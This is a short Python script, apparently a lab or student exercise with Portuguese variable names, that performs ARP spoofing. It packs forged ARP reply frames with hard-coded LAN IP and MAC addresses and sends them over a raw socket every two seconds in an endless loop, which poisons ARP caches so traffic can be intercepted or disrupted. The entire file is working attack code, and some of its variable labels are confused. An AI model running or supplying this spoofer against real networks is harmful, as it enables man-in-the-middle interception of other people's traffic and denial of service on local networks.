import socket
import struct
import binascii
from time import sleep
import subprocess


def get_mac(ip):
    """Get the MAC address of a given IP."""
    output = subprocess.check_output(["arp", "-n"], encoding="utf-8")
    for line in output.splitlines():
        if ip in line:
            return line.split()[2]
    return None


raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
raw.bind(("eth0", socket.htons(0x0806)))

mac_local = '08:00:27:ad:25:87'
ip_local = "192.168.240.26"
mac_dest = get_mac(ip_local)
ip_dest = "192.168.240.124"
mac_router = get_mac(ip_dest)

tipo_hardware = 1
tipo_protocol = 0x0800
len_hardware = 6
len_protocol = 4
operacao = 2

src_ip = socket.inet_aton(ip_local)
dest_ip = socket.inet_aton(ip_dest)


mac_dest_byte_order = binascii.unhexlify(mac_dest.replace(":", ""))
mac_src_byte_order = binascii.unhexlify(mac_local.replace(":", ""))
mac_router_byte_order = binascii.unhexlify(mac_router.replace(":", ""))

# Ethernet frame
protocol = 0x0806
ethernet_frame = struct.pack(
    "!6s6sH", mac_dest_byte_order, mac_src_byte_order, protocol)

arp_header = struct.pack("!HHBBH6s4s6s4s", tipo_hardware,
                         tipo_protocol,
                         len_hardware,
                         len_protocol,
                         operacao,
                         mac_router_byte_order,
                         src_ip,
                         mac_dest_byte_order,
                         dest_ip)

pacote = ethernet_frame + arp_header

while True:
    raw.send(pacote)
    sleep(2)
